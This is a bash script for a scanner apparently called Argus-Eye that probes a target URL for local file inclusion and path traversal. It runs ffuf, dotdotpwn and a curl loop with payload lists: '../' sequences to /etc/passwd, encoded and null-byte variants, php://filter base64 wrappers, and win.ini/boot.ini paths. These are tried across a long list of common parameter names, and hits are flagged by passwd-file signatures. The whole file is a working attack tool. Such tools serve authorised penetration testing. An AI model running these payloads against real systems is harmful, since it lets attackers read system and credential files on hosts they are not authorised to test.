#!/bin/bash
# ================================================
# ARGUS-EYE - LFI / Path Traversal Scanner (Generic)
# Fully target-agnostic. Portable tool paths.
# Tools: ffuf | dotdotpwn | custom_tests
# ================================================

SCANNER_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CORE_DIR="$(cd "$SCANNER_DIR/../core" && pwd)"
source "$CORE_DIR/utils.sh" 2>/dev/null || true
source "$CORE_DIR/installer.sh" 2>/dev/null || true

SCRIPT_DIR="$(cd "$SCANNER_DIR/../.." && pwd)"
TOOLS_DIR="${SCRIPT_DIR}/tools"

show_step() {
    local s=$1 t=$2 tool=$3 st=$4
    case $st in
        "start")    >&2 echo -ne "\n ${CYAN}▶ Step $s/$t:${NC} Running $tool... " ;;
        "complete") >&2 echo -e "${GREEN}✓${NC}" ;;
        "fail")     >&2 echo -e "${RED}✗${NC}" ;;
        "skip")     >&2 echo -e "${YELLOW}skipped${NC}" ;;
    esac
}

get_base_url() {
    echo "$1" | sed -E 's/[?#].*//'
}

build_url() {
    local target=$1 param=$2 value=$3
    local pure_base existing_qs
    pure_base=$(echo "$target" | sed -E 's/[?#].*//')
    existing_qs=$(echo "$target" | grep -oE '\?[^#]*' | sed 's/^?//' || true)

    local encoded_value
    encoded_value=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe='/'))" "$value" 2>/dev/null || \
                    echo "$value" | sed 's/ /%20/g')

    if [[ -z "$existing_qs" ]]; then
        echo "${pure_base}?${param}=${encoded_value}"
        return
    fi

    if echo "$existing_qs" | grep -qE "(^|&)${param}="; then
        local new_qs
        new_qs=$(echo "$existing_qs" | sed -E "s/(^|&)${param}=[^&]*/\1${param}=${encoded_value}/")
        new_qs=$(echo "$new_qs" | sed 's/^&//')
        echo "${pure_base}?${new_qs}"
    else
        echo "${pure_base}?${existing_qs}&${param}=${encoded_value}"
    fi
}

# Success signatures (Linux + Windows + PHP filter)
LFI_SIGNATURES='root:x:|root:.*:0:0:|\[boot loader\]|\[fonts\]|for 16-bit app support|PD9|base64|daemon:x:|www-data:|nobody:x:'

# ================================================
# ffuf LFI fuzzing
# ================================================
run_ffuf_lfi() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "ffuf (LFI)" "start"

    local ffuf_bin=""
    if [[ -x "$SCRIPT_DIR/tools/bin/ffuf" ]]; then
        ffuf_bin="$SCRIPT_DIR/tools/bin/ffuf"
    elif command -v ffuf >/dev/null 2>&1; then
        ffuf_bin="$(command -v ffuf)"
    fi

    if [[ -z "$ffuf_bin" ]]; then
        >&2 echo -e "${YELLOW}[!] ffuf not found – attempting install...${NC}"
        if declare -f install_tool >/dev/null 2>&1; then
            install_tool "ffuf" 2>&1 | tail -5 || true
        fi
        command -v ffuf >/dev/null 2>&1 && ffuf_bin="$(command -v ffuf)"
    fi

    if [[ -z "$ffuf_bin" ]]; then
        >&2 echo -e "${RED}[!] ffuf still not available – skipping${NC}"
        show_step "$step" "$total" "ffuf" "skip"
        echo "0"
        return
    fi

    local payload_file
    payload_file=$(mktemp /tmp/argus_lfi_XXXX.txt)
    cat > "$payload_file" << 'EOF'
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252f..%252fetc%252fpasswd
/etc/passwd
/etc/passwd%00
../../../../etc/passwd%00
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
../../../../windows/win.ini
../../../../boot.ini
..\..\..\..\windows\win.ini
EOF

    # Build fuzz URL: replace existing param value with FUZZ, or append ?file=FUZZ
    local fuzz_url=""
    if [[ "$target" == *\?* ]]; then
        # Use first param name, replace value with FUZZ
        local first_param
        first_param=$(echo "$target" | grep -oE '[?&][^=]+=' | head -1 | sed 's/^[?&]//;s/=$//')
        if [[ -n "$first_param" ]]; then
            local pure_base
            pure_base=$(get_base_url "$target")
            fuzz_url="${pure_base}?${first_param}=FUZZ"
        else
            fuzz_url="${target}&file=FUZZ"
        fi
    else
        fuzz_url="$(get_base_url "$target")?file=FUZZ"
    fi

    >&2 echo -e "  ${CYAN}[*] ffuf URL: $fuzz_url${NC}"
    : > "$out"

    local extra=()
    [[ -n "$COOKIE" ]] && extra+=(-H "Cookie: $COOKIE")

    set +e
    timeout --signal=TERM 120 "$ffuf_bin" -u "$fuzz_url" -w "$payload_file" \
        -mc 200,500 -t 15 -timeout 8 -of md -o "$out.ffuf" \
        "${extra[@]}" >> "$out" 2>&1
    local rc=$?
    set -e

    [[ -f "$out.ffuf" ]] && cat "$out.ffuf" >> "$out" 2>/dev/null || true
    rm -f "$payload_file" "$out.ffuf" 2>/dev/null || true

    if [[ $rc -eq 124 || $rc -eq 137 ]]; then
        >&2 echo -e "  ${YELLOW}[!] ffuf timed out – partial raw kept${NC}"
        echo "[Argus-Eye] ffuf timed out" >> "$out"
    fi

    local count=0
    if [[ -f "$out" && -s "$out" ]]; then
        # Verify interesting responses by re-checking body signatures is ideal;
        # here we count lines that look like hits (status 200 + path-like)
        count=$(grep -ciE 'passwd|win\.ini|boot\.ini|FUZZ|/etc/' "$out" 2>/dev/null || echo 0)
        [[ "$count" =~ ^[0-9]+$ ]] || count=0
        {
            echo "=== FFUF LFI RAW OUTPUT SAVED ==="
            echo "File: $out"
            if [[ $count -gt 0 ]]; then
                grep -iE 'passwd|win\.ini|boot\.ini|200|FUZZ' "$out" | head -30 || true
            fi
        } >> "$findings_file"
    fi

    show_step "$step" "$total" "ffuf" "complete"
    echo "$count"
}

# ================================================
# dotdotpwn (optional)
# ================================================
run_dotdotpwn_lfi() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "dotdotpwn" "start"

    local ddp_bin=""
    if command -v dotdotpwn >/dev/null 2>&1; then
        ddp_bin="dotdotpwn"
    else
        local ddp_pl
        ddp_pl=$(find /usr/share /usr/lib /opt "$SCRIPT_DIR/tools" -name "dotdotpwn.pl" 2>/dev/null | head -1)
        [[ -n "$ddp_pl" ]] && ddp_bin="perl $ddp_pl"
    fi

    if [[ -z "$ddp_bin" ]]; then
        >&2 echo -e "${YELLOW}[!] dotdotpwn not found – skipping${NC}"
        show_step "$step" "$total" "dotdotpwn" "skip"
        echo "0"
        return
    fi

    local host port
    host=$(echo "$target" | sed -E 's#^https?://([^/:]+).*#\1#')
    port=$(echo "$target" | sed -nE 's#^https?://[^/:]+:([0-9]+).*#\1#p')
    [[ -z "$port" ]] && { [[ "$target" == https* ]] && port=443 || port=80; }

    >&2 echo -e "  ${CYAN}[*] dotdotpwn → $host:$port${NC}"
    : > "$out"

    set +e
    # Non-interactive: feed newlines; timeout hard limit
    timeout --signal=TERM 90 bash -c "echo -e '\n\n' | $ddp_bin -m http -h '$host' -p '$port' -f /etc/passwd -k 'root:' -b -q" >> "$out" 2>&1
    local rc=$?
    set -e

    if [[ $rc -eq 124 || $rc -eq 137 ]]; then
        echo "[Argus-Eye] dotdotpwn timed out" >> "$out"
    fi

    local count=0
    if [[ -f "$out" && -s "$out" ]]; then
        count=$(grep -ciE 'vulnerable|\[\+\]|success|root:' "$out" 2>/dev/null || echo 0)
        [[ "$count" =~ ^[0-9]+$ ]] || count=0
        {
            echo "=== DOTDOTPWN RAW OUTPUT SAVED ==="
            echo "File: $out"
            grep -iE 'vulnerable|\[\+\]|success|root:' "$out" | head -20 || true
        } >> "$findings_file"
    fi

    show_step "$step" "$total" "dotdotpwn" "complete"
    echo "$count"
}

# ================================================
# GENERIC CUSTOM LFI TESTS
# ================================================
run_custom_lfi_tests() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "Custom LFI Tests" "start"

    local counter=0

    local payloads=(
        "../../../../etc/passwd"
        "../../../../../etc/passwd"
        "../../../../../../etc/passwd"
        "../../../../../../../etc/passwd"
        "....//....//....//....//etc/passwd"
        "..%2f..%2f..%2f..%2fetc%2fpasswd"
        "/etc/passwd"
        "php://filter/convert.base64-encode/resource=/etc/passwd"
        "../../../../windows/win.ini"
        "../../../../boot.ini"
        "..\\..\\..\\..\\windows\\win.ini"
    )

    local params=(
        "file" "page" "path" "include" "doc" "document" "folder"
        "root" "pg" "style" "pdf" "template" "php_path" "dir"
        "content" "view" "layout" "load" "read" "cat" "action"
    )

    # Prefer params already in the URL
    if [[ "$target" == *\?* ]]; then
        local existing
        existing=$(echo "$target" | grep -oE '[?&][^=]+=' | sed 's/^[?&]//;s/=$//' | head -8)
        if [[ -n "$existing" ]]; then
            local merged=()
            while read -r p; do [[ -n "$p" ]] && merged+=("$p"); done <<< "$existing"
            for p in "${params[@]}"; do
                local seen=0
                for m in "${merged[@]}"; do [[ "$m" == "$p" ]] && seen=1 && break; done
                [[ $seen -eq 0 ]] && merged+=("$p")
            done
            params=("${merged[@]}")
        fi
    fi

    {
        echo "=== GENERIC CUSTOM LFI TESTS ==="
        echo "Target     : $target"
        echo "Date       : $(date)"
        echo "Payloads   : ${#payloads[@]}"
        echo "Parameters : ${#params[@]}"
        echo ""
    } > "$out"

    >&2 echo -e "  ${CYAN}[*] Probing ${#params[@]} params × ${#payloads[@]} LFI payloads...${NC}"

    for param in "${params[@]}"; do
        for payload in "${payloads[@]}"; do
            local test_url
            test_url=$(build_url "$target" "$param" "$payload")

            local response=""
            if [[ -n "$COOKIE" ]]; then
                response=$(curl -s -L --max-time 6 -A "Mozilla/5.0 (Argus-Eye LFI)" -H "Cookie: $COOKIE" "$test_url" 2>/dev/null || true)
            else
                response=$(curl -s -L --max-time 6 -A "Mozilla/5.0 (Argus-Eye LFI)" "$test_url" 2>/dev/null || true)
            fi

            if echo "$response" | grep -qE "$LFI_SIGNATURES"; then
                echo "[POTENTIAL LFI] param=$param payload=$(echo "$payload" | head -c 50) | $test_url" | tee -a "$out" >> "$findings_file"
                ((counter++))
                break  # next param
            fi
        done
        [[ $counter -ge 10 ]] && break
    done

    echo "" >> "$out"
    echo "Custom LFI tests finished. Potential findings: $counter" >> "$out"
    show_step "$step" "$total" "Custom LFI Tests" "complete"
    echo "$counter"
}

# ================================================
# MAIN
# ================================================
scan_lfi() {
    local target=$1
    local output_dir=$2
    local tools=${3:-"ffuf custom_tests"}

    mkdir -p "$output_dir/raw_output" "$output_dir/findings"
    local findings_file="$output_dir/raw_output/lfi_findings.txt"
    local summary_file="$output_dir/raw_output/lfi_summary.txt"

    {
        echo "========================================"
        echo "LFI / PATH TRAVERSAL SCAN RESULTS"
        echo "========================================"
        echo "Target : $target"
        echo "Date   : $(date)"
        echo "Tools  : $tools"
        echo "========================================"
        echo ""
    } > "$findings_file"

    >&2 echo -e "${CYAN}"
    >&2 echo "╔══════════════════════════════════════════════════════════════╗"
    >&2 echo "║        LFI SCANNER (Generic / Path Traversal)                ║"
    >&2 echo "╚══════════════════════════════════════════════════════════════╝"
    >&2 echo -e "${NC}"
    >&2 echo -e "  Target : ${GREEN}$target${NC}"
    >&2 echo -e "  Tools  : ${YELLOW}$tools${NC}"

    local tool_array=()
    if [[ "$tools" == "ALL" || "$tools" == "all" ]]; then
        tool_array=(ffuf dotdotpwn custom_tests)
    else
        read -ra tool_array <<< "$tools"
    fi

    local total_tools=${#tool_array[@]}
    local tools_run=0
    local total_findings=0

    for tool in "${tool_array[@]}"; do
        tools_run=$((tools_run + 1))
        local tool_output="$output_dir/raw_output/${tool}_lfi.txt"
        local tool_findings=0

        set +e
        case "$tool" in
            ffuf)
                tool_findings=$(run_ffuf_lfi "$target" "$tool_output" "$findings_file" "$tools_run" "$total_tools")
                ;;
            dotdotpwn)
                tool_findings=$(run_dotdotpwn_lfi "$target" "$tool_output" "$findings_file" "$tools_run" "$total_tools")
                ;;
            custom_tests)
                tool_findings=$(run_custom_lfi_tests "$target" "$tool_output" "$findings_file" "$tools_run" "$total_tools")
                ;;
            *)
                >&2 echo -e "${YELLOW}[!] Unknown tool: $tool – skipping${NC}"
                tool_findings=0
                ;;
        esac
        set -e

        [[ "$tool_findings" =~ ^[0-9]+$ ]] || tool_findings=0
        total_findings=$((total_findings + tool_findings))
        >&2 echo -e "  ${CYAN}[*] $tool finished (findings: $tool_findings)${NC}"
    done

    {
        echo ""
        echo "========================================"
        echo "LFI SCAN SUMMARY"
        echo "========================================"
        echo "Target          : $target"
        echo "Tools requested : ${tool_array[*]}"
        echo "Total findings  : $total_findings"
        echo "Timestamp       : $(date)"
        echo "========================================"
    } | tee -a "$findings_file" >&2

    echo "$total_findings" > "$summary_file"
    echo "$total_findings"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ $# -lt 2 ]]; then
        echo "Usage: $0 <target_url> <output_dir> [tools]"
        echo "  tools: ffuf dotdotpwn custom_tests  (default: ffuf custom_tests)"
        echo "  Example: $0 'http://target.example/page?file=index' /tmp/lfi 'ffuf custom_tests'"
        exit 1
    fi
    findings=$(scan_lfi "$1" "$2" "${3:-ffuf custom_tests}")
    echo "$findings"
fi
